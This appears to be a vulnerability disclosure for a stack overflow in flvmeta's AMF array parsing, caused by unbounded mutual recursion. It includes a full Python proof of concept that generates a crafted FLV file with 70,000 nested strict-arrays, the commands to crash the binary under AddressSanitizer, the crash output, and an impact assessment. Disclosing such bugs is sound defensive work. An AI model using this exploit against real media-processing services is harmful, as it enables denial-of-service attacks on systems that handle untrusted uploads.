## Bug0: Stack overflow via unbounded mutual recursion in AMF array parsing

In `amf_data_read()` and `amf_array_read()` in `src/amf.c`, the two functions call each other recursively with no depth limit so a crafted FLV script tag containing 70 000 levels of nested AMF strict-arrays exhausts the 8 MB thread stack and causes a SIGSEGV crash.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for flvmeta stack overflow via unbounded recursion in AMF parsing.

Trigger path:
  flvmeta main() -> flv_parse() -> flv_read_metadata() -> amf_data_file_read()
    -> amf_data_read() -> amf_array_read() -> (loop) -> amf_data_read()
    -> amf_array_read() -> ... [unbounded mutual recursion]
"""

import struct
import sys

DEPTH = 70000
OUTPUT = "poc_input.flv"


def build_amf_payload(depth: int) -> bytes:
    """Build deeply nested AMF strict-array payload followed by a leaf number."""
    # AMF string "onMetaData": type 0x02 + 2-byte length + UTF-8 bytes
    name = b"onMetaData"
    amf_name = b"\x02" + struct.pack(">H", len(name)) + name

    # Nested strict-arrays: each level = 0x0A + uint32_BE(1)
    nested = b"\x0a" + struct.pack(">I", 1)
    arrays = nested * depth

    # Leaf: AMF number 0.0 (type 0x00 + 8-byte IEEE-754 double = 0.0)
    leaf = b"\x00" + b"\x00" * 8

    return amf_name + arrays + leaf


def build_flv(payload: bytes) -> bytes:
    """Wrap the AMF payload in a valid FLV file."""
    # FLV header: signature + version(1) + flags(5=audio+video) + header_size(9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size (always 0 at start)
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag: type 0x12 (script data), 3-byte data size, timestamp, stream id
    tag_type = b"\x12"
    data_size = len(payload)
    tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    ts_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = tag_type + tag_data_size + timestamp + ts_ext + stream_id + payload

    # Previous tag size after script tag = 11 (tag header) + data_size
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


def main():
    out_path = OUTPUT
    if len(sys.argv) > 1:
        out_path = sys.argv[1]

    print(f"[*] Building AMF payload with {DEPTH} nested strict-arrays...")
    payload = build_amf_payload(DEPTH)
    print(f"[*] AMF payload size: {len(payload)} bytes")

    flv_data = build_flv(payload)
    print(f"[*] Total FLV size: {len(flv_data)} bytes")

    with open(out_path, "wb") as f:
        f.write(flv_data)
    print(f"[+] Written to: {out_path}")


if __name__ == "__main__":
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==1849313==ERROR: AddressSanitizer: stack-overflow on address 0x7fffa06f4ff0 (pc 0x7fd8906de8c1 bp 0x000000000000 sp 0x7fffa06f4fe0 T0)
SUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_stackdepot.cpp:54 in __sanitizer::StackDepotNode::hash(__sanitizer::StackTrace const&)

### Impact

An attacker who supplies a crafted FLV file with deeply nested AMF strict-arrays can crash the flvmeta process through uncontrolled stack exhaustion, constituting a reliable denial-of-service condition. The attack surface includes any pipeline or service that invokes flvmeta on untrusted input, such as media upload handlers and video processing workflows. No heap or buffer-overflow primitive is produced so the immediate impact is limited to process termination, though environments where stack canaries or guard pages are absent could theoretically allow further exploitation.
